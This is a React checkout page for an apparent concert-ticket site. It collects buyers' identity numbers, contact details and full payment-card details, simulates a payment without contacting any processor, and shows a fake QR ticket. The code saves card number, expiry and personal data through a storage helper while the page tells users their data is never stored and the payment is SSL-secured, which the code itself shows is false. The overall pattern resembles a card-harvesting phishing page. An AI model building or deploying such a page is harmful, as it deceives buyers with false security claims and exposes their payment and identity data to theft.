import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import {
  ArrowLeft, Lock, CheckCircle, ChevronRight,
  Ticket, CreditCard, User, Mail, Phone,
  Shield, Info, Minus, Plus, MapPin, Clock
} from 'lucide-react';
import { shows } from '../data/shows';
import { savePurchase, generateId, detectCardType, formatCurrency } from '../utils/storage';
import { PurchaseData } from '../types';
import styles from './Checkout.module.css';

// ── Card brand logos ──────────────────────────────────────────────────────────
function VisaLogo({ size = 46 }: { size?: number }) {
  return (
    <svg width={size} height={Math.round(size * 0.63)} viewBox="0 0 46 29" fill="none">
      <rect width="46" height="29" rx="5" fill="#1A1F71"/>
      <text x="6" y="21" fontFamily="Arial" fontWeight="bold" fontSize="16" fill="white">VISA</text>
    </svg>
  );
}
function MastercardLogo({ size = 46 }: { size?: number }) {
  return (
    <svg width={size} height={Math.round(size * 0.63)} viewBox="0 0 46 29" fill="none">
      <rect width="46" height="29" rx="5" fill="#1a1a1a"/>
      <circle cx="17" cy="14.5" r="9.5" fill="#EB001B"/>
      <circle cx="29" cy="14.5" r="9.5" fill="#F79E1B"/>
      <path d="M23 7.2a9.5 9.5 0 010 14.6 9.5 9.5 0 010-14.6z" fill="#FF5F00"/>
    </svg>
  );
}

// ── Helpers ───────────────────────────────────────────────────────────────────
function fmtCard(v: string) {
  return v.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim();
}
function fmtExp(v: string) {
  const c = v.replace(/\D/g, '').slice(0, 4);
  return c.length >= 3 ? c.slice(0, 2) + '/' + c.slice(2) : c;
}

// ── Seat sections ─────────────────────────────────────────────────────────────
const SECTIONS = [
  { name: 'Campo',        extra: 0,      desc: 'Zona de pie frente al escenario',     color: '#7c3aed' },
  { name: 'Platea Baja',  extra: 5000,   desc: 'Sentado, vista privilegiada',          color: '#6d28d9' },
  { name: 'Platea Alta',  extra: -5000,  desc: 'Sentado, nivel superior',              color: '#5b21b6' },
  { name: 'General',      extra: -10000, desc: 'Acceso general al recinto',             color: '#4c1d95' },
  { name: 'VIP',          extra: 30000,  desc: 'Zona exclusiva con servicios premium', color: '#a78bfa' },
];

const CUOTAS_CREDIT = [
  { n: 1,  label: '1 cuota sin interes' },
  { n: 3,  label: '3 cuotas sin interes' },
  { n: 6,  label: '6 cuotas sin interes' },
  { n: 12, label: '12 cuotas' },
];

type Step = 'tickets' | 'datos' | 'pago' | 'confirmacion';

interface Form {
  // personal
  firstName: string; lastName: string; dni: string;
  email: string; emailConfirm: string; phone: string;
  // card
  cardType: 'credito' | 'debito';
  cardNumber: string; cardHolder: string;
  cardExpiry: string; cardCvv: string;
  cuotas: number;
  // selection
  section: string; quantity: number;
}

type Errors = Partial<Record<keyof Form, string>>;

export default function Checkout() {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const show = shows.find(s => s.id === id);

  const [step, setStep] = useState<Step>('tickets');
  const [purchaseId, setPurchaseId] = useState('');
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState<Errors>({});
  const [timer, setTimer] = useState(600); // 10 min reservation timer

  const [form, setForm] = useState<Form>({
    firstName: '', lastName: '', dni: '',
    email: '', emailConfirm: '', phone: '',
    cardType: 'credito',
    cardNumber: '', cardHolder: '', cardExpiry: '', cardCvv: '',
    cuotas: 1,
    section: 'Campo', quantity: 1,
  });

  // Reservation countdown
  useEffect(() => {
    if (step === 'tickets') return;
    if (timer <= 0) { navigate(`/show/${show?.id}`); return; }
    const iv = setInterval(() => setTimer(t => t - 1), 1000);
    return () => clearInterval(iv);
  }, [step, timer]);

  if (!show) return (
    <div className={styles.notFound}>
      <p>Show no encontrado.</p>
      <button className="btn-primary" onClick={() => navigate('/shows')}>Ver shows</button>
    </div>
  );

  const section = SECTIONS.find(s => s.name === form.section) ?? SECTIONS[0];
  const basePrice = show.price + section.extra;
  const serviceFee = Math.round(basePrice * 0.12);
  const subtotal = (basePrice + serviceFee) * form.quantity;
  const cardBrand = detectCardType(form.cardNumber);

  function set<K extends keyof Form>(k: K, v: Form[K]) {
    setForm(p => ({ ...p, [k]: v }));
    setErrors(p => { const e = { ...p }; delete e[k]; return e; });
  }

  // ── Validation ──────────────────────────────────────────────────────────────
  function validateDatos(): boolean {
    const e: Errors = {};
    if (!form.firstName.trim()) e.firstName = 'Requerido';
    if (!form.lastName.trim()) e.lastName = 'Requerido';
    if (!/^\d{7,9}$/.test(form.dni)) e.dni = 'DNI invalido (7-9 digitos)';
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) e.email = 'Email invalido';
    if (form.email !== form.emailConfirm) e.emailConfirm = 'Los emails no coinciden';
    if (!/^\d{8,15}$/.test(form.phone)) e.phone = 'Telefono invalido';
    setErrors(e);
    return Object.keys(e).length === 0;
  }

  function validatePago(): boolean {
    const e: Errors = {};
    const clean = form.cardNumber.replace(/\s/g, '');
    if (clean.length !== 16) e.cardNumber = 'Numero invalido (16 digitos)';
    if (!form.cardHolder.trim()) e.cardHolder = 'Requerido';
    if (!/^\d{2}\/\d{2}$/.test(form.cardExpiry)) e.cardExpiry = 'Formato MM/AA';
    else {
      const [mm, yy] = form.cardExpiry.split('/').map(Number);
      const now = new Date(); const cy = now.getFullYear() % 100; const cm = now.getMonth() + 1;
      if (mm < 1 || mm > 12) e.cardExpiry = 'Mes invalido';
      else if (yy < cy || (yy === cy && mm < cm)) e.cardExpiry = 'Tarjeta vencida';
    }
    if (!/^\d{3,4}$/.test(form.cardCvv)) e.cardCvv = 'CVV invalido';
    setErrors(e);
    return Object.keys(e).length === 0;
  }

  // ── Submit ───────────────────────────────────────────────────────────────────
  async function handlePay() {
    if (!validatePago()) return;
    setLoading(true);
    await new Promise(r => setTimeout(r, 2200));
    const pid = generateId();
    const purchase: PurchaseData = {
      id: pid,
      showId: show.id, showTitle: show.title, showDate: show.dateLabel,
      quantity: form.quantity, section: form.section,
      totalAmount: subtotal,
      cardNumber: form.cardNumber, cardHolder: form.cardHolder,
      cardType: cardBrand, cardExpiry: form.cardExpiry,
      dni: form.dni, email: form.email, phone: form.phone,
      firstName: form.firstName, lastName: form.lastName,
      createdAt: new Date().toISOString(), status: 'confirmed',
    };
    savePurchase(purchase);
    setPurchaseId(pid);
    setLoading(false);
    setStep('confirmacion');
  }

  const timerMin = String(Math.floor(timer / 60)).padStart(2, '0');
  const timerSec = String(timer % 60).padStart(2, '0');

  const stepIndex = { tickets: 0, datos: 1, pago: 2, confirmacion: 3 };
  const stepLabels = ['Entradas', 'Datos', 'Pago', 'Confirmacion'];

  // ── RENDER ───────────────────────────────────────────────────────────────────
  return (
    <div className={styles.page}>

      {/* ── Header ─────────────────────────────────────────────────────────── */}
      <div className={styles.topBar}>
        <div className={styles.topInner}>
          <button className={styles.backBtn} onClick={() => step === 'tickets' ? navigate(`/show/${show.id}`) : setStep(step === 'datos' ? 'tickets' : step === 'pago' ? 'datos' : 'tickets')}>
            <ArrowLeft size={15} />
            {step === 'tickets' ? 'Volver al show' : 'Atras'}
          </button>

          {/* Step indicators */}
          {step !== 'confirmacion' && (
            <div className={styles.stepBar}>
              {stepLabels.slice(0, 3).map((label, i) => (
                <div key={label} className={styles.stepItem}>
                  <div className={`${styles.stepDot} ${stepIndex[step] > i ? styles.stepDone : stepIndex[step] === i ? styles.stepActive : ''}`}>
                    {stepIndex[step] > i ? <CheckCircle size={14} /> : <span>{i + 1}</span>}
                  </div>
                  <span className={`${styles.stepLabel} ${stepIndex[step] === i ? styles.stepLabelActive : ''}`}>{label}</span>
                  {i < 2 && <ChevronRight size={14} className={styles.stepArrow} />}
                </div>
              ))}
            </div>
          )}

          {/* Reservation timer */}
          {step !== 'tickets' && step !== 'confirmacion' && (
            <div className={`${styles.timerBox} ${timer < 120 ? styles.timerUrgent : ''}`}>
              <Clock size={14} />
              <span>Reserva: {timerMin}:{timerSec}</span>
            </div>
          )}
        </div>
      </div>

      <div className={styles.layout}>

        {/* ── LEFT: Steps ──────────────────────────────────────────────────── */}
        <div className={styles.main}>

          {/* ══ STEP 1: Seleccion de entradas ════════════════════════════════ */}
          {step === 'tickets' && (
            <div className={styles.card}>
              <h2 className={styles.cardTitle}>
                <Ticket size={20} />
                Selecciona tus entradas
              </h2>

              {/* Section picker */}
              <div className={styles.sectionGrid}>
                {SECTIONS.map(sec => {
                  const secPrice = show.price + sec.extra;
                  return (
                    <button
                      key={sec.name}
                      className={`${styles.sectionBtn} ${form.section === sec.name ? styles.sectionBtnActive : ''}`}
                      onClick={() => set('section', sec.name)}
                    >
                      <div className={styles.sectionDot} style={{ background: sec.color }} />
                      <div className={styles.sectionInfo}>
                        <span className={styles.sectionName}>{sec.name}</span>
                        <span className={styles.sectionDesc}>{sec.desc}</span>
                      </div>
                      <span className={styles.sectionPrice}>{formatCurrency(secPrice)}</span>
                    </button>
                  );
                })}
              </div>

              {/* Quantity */}
              <div className={styles.qtyRow}>
                <div>
                  <div className={styles.qtyLabel}>Cantidad de entradas</div>
                  <div className={styles.qtySubLabel}>Maximo 6 por compra</div>
                </div>
                <div className={styles.qtyControls}>
                  <button className={styles.qtyBtn} onClick={() => set('quantity', Math.max(1, form.quantity - 1))} disabled={form.quantity <= 1}>
                    <Minus size={16} />
                  </button>
                  <span className={styles.qtyNum}>{form.quantity}</span>
                  <button className={styles.qtyBtn} onClick={() => set('quantity', Math.min(6, form.quantity + 1))} disabled={form.quantity >= 6}>
                    <Plus size={16} />
                  </button>
                </div>
              </div>

              {/* Info notice */}
              <div className={styles.notice}>
                <Info size={14} />
                <span>Las entradas se enviaran al email que ingreses en el siguiente paso. Presenta el QR en la puerta.</span>
              </div>

              <button className={styles.nextBtn} onClick={() => { setTimer(600); setStep('datos'); }}>
                Continuar
                <ChevronRight size={18} />
              </button>
            </div>
          )}

          {/* ══ STEP 2: Datos personales ══════════════════════════════════════ */}
          {step === 'datos' && (
            <div className={styles.card}>
              <h2 className={styles.cardTitle}>
                <User size={20} />
                Datos del comprador
              </h2>
              <p className={styles.cardSub}>Las entradas se emitiran a nombre del DNI ingresado. Presenta tu DNI en la puerta.</p>

              <div className={styles.formGrid2}>
                <div className="form-group">
                  <label className="form-label">Nombre</label>
                  <input className={`form-input ${errors.firstName ? 'error' : ''}`} placeholder="Juan" value={form.firstName} onChange={e => set('firstName', e.target.value)} />
                  {errors.firstName && <span className="form-error">{errors.firstName}</span>}
                </div>
                <div className="form-group">
                  <label className="form-label">Apellido</label>
                  <input className={`form-input ${errors.lastName ? 'error' : ''}`} placeholder="Garcia" value={form.lastName} onChange={e => set('lastName', e.target.value)} />
                  {errors.lastName && <span className="form-error">{errors.lastName}</span>}
                </div>
              </div>

              <div className="form-group" style={{ marginTop: 16 }}>
                <label className="form-label">DNI (sin puntos)</label>
                <input className={`form-input ${errors.dni ? 'error' : ''}`} placeholder="12345678" value={form.dni} onChange={e => set('dni', e.target.value.replace(/\D/g, '').slice(0, 9))} />
                {errors.dni && <span className="form-error">{errors.dni}</span>}
              </div>

              <div className="form-group" style={{ marginTop: 16 }}>
                <label className="form-label">Email</label>
                <div className={styles.inputIcon}>
                  <Mail size={16} className={styles.inputIconSvg} />
                  <input className={`form-input ${styles.inputWithIcon} ${errors.email ? 'error' : ''}`} placeholder="juan@email.com" type="email" value={form.email} onChange={e => set('email', e.target.value)} />
                </div>
                {errors.email && <span className="form-error">{errors.email}</span>}
              </div>

              <div className="form-group" style={{ marginTop: 16 }}>
                <label className="form-label">Confirmar email</label>
                <div className={styles.inputIcon}>
                  <Mail size={16} className={styles.inputIconSvg} />
                  <input className={`form-input ${styles.inputWithIcon} ${errors.emailConfirm ? 'error' : ''}`} placeholder="Repetir email" type="email" value={form.emailConfirm} onChange={e => set('emailConfirm', e.target.value)} />
                </div>
                {errors.emailConfirm && <span className="form-error">{errors.emailConfirm}</span>}
              </div>

              <div className="form-group" style={{ marginTop: 16 }}>
                <label className="form-label">Telefono celular</label>
                <div className={styles.inputIcon}>
                  <Phone size={16} className={styles.inputIconSvg} />
                  <input className={`form-input ${styles.inputWithIcon} ${errors.phone ? 'error' : ''}`} placeholder="1123456789" value={form.phone} onChange={e => set('phone', e.target.value.replace(/\D/g, '').slice(0, 15))} />
                </div>
                {errors.phone && <span className="form-error">{errors.phone}</span>}
              </div>

              <div className={styles.termsNote}>
                <Shield size={13} />
                Tus datos estan protegidos y no seran compartidos con terceros.
              </div>

              <button className={styles.nextBtn} onClick={() => { if (validateDatos()) setStep('pago'); }}>
                Continuar al pago
                <ChevronRight size={18} />
              </button>
            </div>
          )}

          {/* ══ STEP 3: Pago ══════════════════════════════════════════════════ */}
          {step === 'pago' && (
            <div className={styles.card}>
              <h2 className={styles.cardTitle}>
                <CreditCard size={20} />
                Metodo de pago
              </h2>

              {/* Debit / Credit toggle */}
              <div className={styles.payToggle}>
                <button
                  className={`${styles.payToggleBtn} ${form.cardType === 'credito' ? styles.payToggleActive : ''}`}
                  onClick={() => { set('cardType', 'credito'); set('cuotas', 1); }}
                >
                  <CreditCard size={17} />
                  Tarjeta de Credito
                </button>
                <button
                  className={`${styles.payToggleBtn} ${form.cardType === 'debito' ? styles.payToggleActive : ''}`}
                  onClick={() => { set('cardType', 'debito'); set('cuotas', 1); }}
                >
                  <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="1" y="4" width="22" height="16" rx="2"/>
                    <line x1="1" y1="10" x2="23" y2="10"/>
                  </svg>
                  Tarjeta de Debito
                </button>
              </div>

              {/* Accepted brands */}
              <div className={styles.brandsRow}>
                <span className={styles.brandsLabel}>Aceptamos</span>
                <VisaLogo size={46} />
                <MastercardLogo size={46} />
              </div>

              {/* Card preview */}
              <div className={styles.cardPreview}>
                <div className={styles.cardFront}>
                  <div className={styles.cardChip}>
                    <svg width="32" height="26" viewBox="0 0 32 26" fill="none">
                      <rect x="1" y="1" width="30" height="24" rx="4" fill="#d4a017" stroke="#b8860b" strokeWidth="1"/>
                      <line x1="1" y1="9" x2="31" y2="9" stroke="#b8860b" strokeWidth="1"/>
                      <line x1="1" y1="17" x2="31" y2="17" stroke="#b8860b" strokeWidth="1"/>
                      <line x1="11" y1="1" x2="11" y2="25" stroke="#b8860b" strokeWidth="1"/>
                      <line x1="21" y1="1" x2="21" y2="25" stroke="#b8860b" strokeWidth="1"/>
                    </svg>
                  </div>
                  <div className={styles.cardLogo}>
                    {cardBrand === 'visa' && <VisaLogo size={42} />}
                    {cardBrand === 'mastercard' && <MastercardLogo size={42} />}
                    {cardBrand === 'unknown' && (
                      <div className={styles.cardBrandPlaceholders}>
                        <VisaLogo size={36} />
                        <MastercardLogo size={36} />
                      </div>
                    )}
                  </div>
                  <div className={styles.cardNumber}>
                    {form.cardNumber || '**** **** **** ****'}
                  </div>
                  <div className={styles.cardBottom}>
                    <div>
                      <div className={styles.cardFieldLabel}>TITULAR</div>
                      <div className={styles.cardFieldVal}>{form.cardHolder.toUpperCase() || 'NOMBRE APELLIDO'}</div>
                    </div>
                    <div>
                      <div className={styles.cardFieldLabel}>VENCE</div>
                      <div className={styles.cardFieldVal}>{form.cardExpiry || 'MM/AA'}</div>
                    </div>
                    <div>
                      <div className={styles.cardFieldLabel}>TIPO</div>
                      <div className={styles.cardFieldVal}>{form.cardType === 'credito' ? 'CREDITO' : 'DEBITO'}</div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Card fields */}
              <div className="form-group">
                <label className="form-label">Numero de tarjeta</label>
                <div className={styles.cardInputWrap}>
                  <input
                    className={`form-input ${styles.cardInput} ${errors.cardNumber ? 'error' : ''}`}
                    placeholder="1234 5678 9012 3456"
                    value={form.cardNumber}
                    onChange={e => set('cardNumber', fmtCard(e.target.value))}
                    maxLength={19}
                    inputMode="numeric"
                  />
                  {cardBrand !== 'unknown' && (
                    <div className={styles.cardInputBrand}>
                      {cardBrand === 'visa' && <VisaLogo size={36} />}
                      {cardBrand === 'mastercard' && <MastercardLogo size={36} />}
                    </div>
                  )}
                </div>
                {errors.cardNumber && <span className="form-error">{errors.cardNumber}</span>}
              </div>

              <div className="form-group" style={{ marginTop: 14 }}>
                <label className="form-label">Nombre del titular (igual que en la tarjeta)</label>
                <input
                  className={`form-input ${errors.cardHolder ? 'error' : ''}`}
                  placeholder="JUAN GARCIA"
                  value={form.cardHolder}
                  onChange={e => set('cardHolder', e.target.value.toUpperCase())}
                />
                {errors.cardHolder && <span className="form-error">{errors.cardHolder}</span>}
              </div>

              <div className={styles.formRow} style={{ marginTop: 14 }}>
                <div className="form-group">
                  <label className="form-label">Fecha de vencimiento</label>
                  <input
                    className={`form-input ${errors.cardExpiry ? 'error' : ''}`}
                    placeholder="MM/AA"
                    value={form.cardExpiry}
                    onChange={e => set('cardExpiry', fmtExp(e.target.value))}
                    maxLength={5}
                    inputMode="numeric"
                  />
                  {errors.cardExpiry && <span className="form-error">{errors.cardExpiry}</span>}
                </div>
                <div className="form-group">
                  <label className="form-label">
                    CVV / CVC
                    <span className={styles.cvvHelp} title="Los 3 o 4 digitos del dorso de la tarjeta">?</span>
                  </label>
                  <div className={styles.cardInputWrap}>
                    <input
                      className={`form-input ${errors.cardCvv ? 'error' : ''}`}
                      placeholder="123"
                      value={form.cardCvv}
                      onChange={e => set('cardCvv', e.target.value.replace(/\D/g, '').slice(0, 4))}
                      type="password"
                      maxLength={4}
                      inputMode="numeric"
                    />
                    <Lock size={14} color="rgba(255,255,255,0.25)" style={{ position: 'absolute', right: 14, top: '50%', transform: 'translateY(-50%)', pointerEvents: 'none' }} />
                  </div>
                  {errors.cardCvv && <span className="form-error">{errors.cardCvv}</span>}
                </div>
              </div>

              {/* Cuotas — solo credito */}
              {form.cardType === 'credito' && (
                <div className="form-group" style={{ marginTop: 14 }}>
                  <label className="form-label">Cuotas</label>
                  <div className={styles.cuotasGrid}>
                    {CUOTAS_CREDIT.map(c => (
                      <button
                        key={c.n}
                        className={`${styles.cuotaBtn} ${form.cuotas === c.n ? styles.cuotaBtnActive : ''}`}
                        onClick={() => set('cuotas', c.n)}
                      >
                        <span className={styles.cuotaN}>{c.n}x</span>
                        <span className={styles.cuotaLabel}>{c.label}</span>
                        <span className={styles.cuotaAmt}>{formatCurrency(Math.ceil(subtotal / c.n))}</span>
                      </button>
                    ))}
                  </div>
                </div>
              )}

              <div className={styles.secureRow}>
                <Lock size={13} />
                <span>Pago seguro con encriptacion SSL 256-bit. Tus datos nunca se almacenan.</span>
              </div>

              <button className={styles.payBtn} onClick={handlePay} disabled={loading}>
                {loading ? (
                  <>
                    <span className={styles.spinner} />
                    Procesando pago...
                  </>
                ) : (
                  <>
                    <Lock size={16} />
                    Pagar {formatCurrency(subtotal)}
                  </>
                )}
              </button>
            </div>
          )}

          {/* ══ STEP 4: Confirmacion ══════════════════════════════════════════ */}
          {step === 'confirmacion' && (
            <div className={styles.successCard}>
              <div className={styles.successCheck}>
                <CheckCircle size={64} color="#10b981" />
              </div>
              <h2 className={styles.successTitle}>Pago exitoso</h2>
              <p className={styles.successSub}>
                Tus entradas fueron confirmadas. Recibirás un email en <strong>{form.email}</strong> con los QR de ingreso.
              </p>

              <div className={styles.ticketCard}>
                <div className={styles.ticketCardHeader}>
                  <Ticket size={18} />
                  Detalle de tu compra
                </div>
                <div className={styles.ticketBody}>
                  <div className={styles.ticketRow}>
                    <span>Numero de orden</span>
                    <strong className={styles.ticketId}>{purchaseId}</strong>
                  </div>
                  <div className={styles.ticketDivider} />
                  <div className={styles.ticketRow}><span>Show</span><strong>{show.title}</strong></div>
                  <div className={styles.ticketRow}><span>Fecha</span><strong>{show.dateLabel}</strong></div>
                  <div className={styles.ticketRow}><span>Horario</span><strong>Puertas {show.puertas} | Show {show.showTime}</strong></div>
                  <div className={styles.ticketRow}><span>Lugar</span><strong>Pacify Arena — Buenos Aires</strong></div>
                  <div className={styles.ticketDivider} />
                  <div className={styles.ticketRow}><span>Sector</span><strong>{form.section}</strong></div>
                  <div className={styles.ticketRow}><span>Entradas</span><strong>{form.quantity}</strong></div>
                  <div className={styles.ticketRow}><span>Comprador</span><strong>{form.firstName} {form.lastName}</strong></div>
                  <div className={styles.ticketRow}><span>DNI</span><strong>{form.dni}</strong></div>
                  <div className={styles.ticketDivider} />
                  <div className={`${styles.ticketRow} ${styles.ticketTotal}`}>
                    <span>Total pagado</span>
                    <strong>{formatCurrency(subtotal)}</strong>
                  </div>
                  {form.cardType === 'credito' && form.cuotas > 1 && (
                    <div className={styles.ticketRow} style={{ color: 'rgba(255,255,255,0.5)', fontSize: 12 }}>
                      <span>Financiacion</span>
                      <span>{form.cuotas} cuotas de {formatCurrency(Math.ceil(subtotal / form.cuotas))}</span>
                    </div>
                  )}
                </div>

                {/* Fake QR */}
                <div className={styles.qrSection}>
                  <div className={styles.qrBox}>
                    <svg width="100" height="100" viewBox="0 0 100 100" fill="none">
                      {/* QR pattern simulation */}
                      {[0,1,2,3,4,5,6].map(r => [0,1,2,3,4,5,6].map(c => {
                        const edge = r === 0 || r === 6 || c === 0 || c === 6;
                        const inner = r >= 1 && r <= 5 && c >= 1 && c <= 5;
                        const center = r >= 2 && r <= 4 && c >= 2 && c <= 4;
                        if (edge || center) return <rect key={`${r}-${c}`} x={r*14+1} y={c*14+1} width="13" height="13" rx="1" fill="white"/>;
                        return null;
                      }))}
                      {/* Bottom-left finder */}
                      {[0,1,2,3,4,5,6].map(r => [57,58,59,60,61,62,63].map((cy, c) => {
                        const edge = r === 0 || r === 6 || c === 0 || c === 6;
                        const center = r >= 2 && r <= 4 && c >= 2 && c <= 4;
                        if (edge || center) return <rect key={`bl-${r}-${cy}`} x={r*14+1} y={cy+1} width="13" height="13" rx="1" fill="white"/>;
                        return null;
                      }))}
                      {/* Data dots */}
                      {Array.from({ length: 18 }, (_, i) => (
                        <rect key={`d${i}`} x={(i % 4) * 14 + 58} y={Math.floor(i / 4) * 14 + 1} width="10" height="10" rx="1" fill="white" opacity={Math.random() > 0.4 ? 1 : 0}/>
                      ))}
                    </svg>
                  </div>
                  <div className={styles.qrText}>
                    <p>Presenta este QR en la entrada</p>
                    <p>Una entrada por persona</p>
                  </div>
                </div>
              </div>

              <div className={styles.successActions}>
                <button className="btn-primary" onClick={() => navigate('/')}>Volver al inicio</button>
                <button className="btn-outline" onClick={() => navigate('/shows')}>Ver mas shows</button>
              </div>
            </div>
          )}
        </div>

        {/* ── RIGHT: Order summary ──────────────────────────────────────────── */}
        {step !== 'confirmacion' && (
          <aside className={styles.sidebar}>
            <div className={styles.summaryCard}>
              <h3 className={styles.summaryTitle}>Tu orden</h3>

              {/* Show image */}
              <div className={styles.summaryImg}>
                <img
                  src={`/images/${show.image}`}
                  alt={show.title}
                  onError={(e) => {
                    const t = e.target as HTMLImageElement;
                    t.style.display = 'none';
                    (t.nextElementSibling as HTMLElement).style.display = 'flex';
                  }}
                />
                <div className={styles.summaryImgFallback} style={{ background: show.bgGradient }}>
                  {show.title.toUpperCase()}
                </div>
              </div>

              <div className={styles.summaryInfo}>
                <div className={styles.summaryShow}>{show.title}</div>
                <div className={styles.summaryDetail}>
                  <MapPin size={13} />
                  Pacify Arena — Buenos Aires
                </div>
                <div className={styles.summaryDetail}>
                  <Clock size={13} />
                  {show.dateLabel} | Show {show.showTime}
                </div>
              </div>

              <div className={styles.summaryBreakdown}>
                <div className={styles.summaryLine}>
                  <span>{form.quantity}x Entrada — {form.section}</span>
                  <span>{formatCurrency(basePrice * form.quantity)}</span>
                </div>
                <div className={styles.summaryLine}>
                  <span>Cargo por servicio</span>
                  <span>{formatCurrency(serviceFee * form.quantity)}</span>
                </div>
                <div className={styles.summaryDivider} />
                <div className={`${styles.summaryLine} ${styles.summaryTotalLine}`}>
                  <span>Total</span>
                  <span>{formatCurrency(subtotal)}</span>
                </div>
                {form.cardType === 'credito' && form.cuotas > 1 && (
                  <div className={styles.summaryLine} style={{ fontSize: 12, color: 'rgba(255,255,255,0.45)' }}>
                    <span>{form.cuotas} cuotas de</span>
                    <span>{formatCurrency(Math.ceil(subtotal / form.cuotas))}</span>
                  </div>
                )}
              </div>

              <div className={styles.summarySecure}>
                <Shield size={13} />
                Compra 100% segura
              </div>
            </div>
          </aside>
        )}
      </div>
    </div>
  );
}
